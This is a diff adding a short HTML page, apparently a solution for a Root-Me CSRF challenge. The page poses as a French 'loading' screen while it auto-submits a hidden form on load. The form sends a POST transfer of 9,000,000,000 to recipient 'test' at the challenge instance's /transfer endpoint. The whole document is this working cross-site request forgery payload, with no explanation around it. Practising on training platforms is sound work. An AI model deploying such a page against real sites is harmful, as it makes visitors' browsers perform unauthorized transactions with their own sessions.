@@ -1,0 +1,13 @@
+<html>
+<head><title>Chargement...</title></head>
+<body onload="document.forms[0].submit()">
+<h1>Chargement en cours...</h1>
+<form id="csrf" action="https://instance-019ab63e-ac62-70ba-9287-5af8e2879cf2.challenges.root-me.pro/transfer" method="POST">
+  <input type="hidden" name="recipient" value="test"/>
+  <input type="hidden" name="amount" value="9000000000"/>
+</form>
+<script>
+  document.getElementById('csrf').submit();
+</script>
+</body>
+</html>
